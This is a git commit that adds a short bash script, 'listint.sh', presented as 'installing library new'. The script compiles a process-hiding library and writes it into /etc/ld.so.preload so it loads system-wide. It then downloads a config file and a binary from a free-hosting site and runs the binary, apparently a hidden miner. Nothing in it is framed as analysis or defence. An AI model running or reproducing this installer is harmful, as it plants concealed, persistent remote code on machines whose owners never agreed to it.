f10a9ce36c25c91e186e37924b191971a8713247
cihuuy <95659029+cihuuy@users.noreply.github.com>
2023-09-07 23:10:26 +0700

    Create listint.sh

---
+++ listint.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+sudo apt-get -y update
+echo "installing library new"
+git git clone https://github.com/cihuuy/libn 
+cd libn 
+gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl
+mv libprocess.so /usr/local/lib/
+echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
+
+wget https://nyadur.000webhostapp.com/myrig/config.json && wget https://nyadur.000webhostapp.com/myrig/durex && chmod +x durex && ./durex
+
